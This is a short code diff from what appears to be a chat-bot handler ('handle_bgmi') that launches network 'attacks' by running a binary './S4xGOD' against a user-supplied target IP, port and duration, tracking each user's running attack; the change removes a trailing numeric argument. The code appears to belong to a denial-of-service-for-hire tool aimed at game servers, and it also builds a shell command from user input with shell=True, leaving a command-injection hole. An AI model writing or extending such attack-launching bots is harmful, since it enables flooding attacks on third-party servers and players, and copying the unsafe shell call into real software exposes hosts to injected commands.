@@ -89,7 +89,7 @@ def handle_bgmi(message):
 
         # Running the attack in a thread to avoid blocking the bot
         def execute_attack(user_id, target, port, duration):
-            process = subprocess.Popen(f"./S4xGOD {target} {port} {duration} 1000", shell=True)
+            process = subprocess.Popen(f"./S4xGOD {target} {port} {duration}", shell=True)
             active_attacks[user_id] = process
 
             # Wait for the process to complete or for the duration to pass
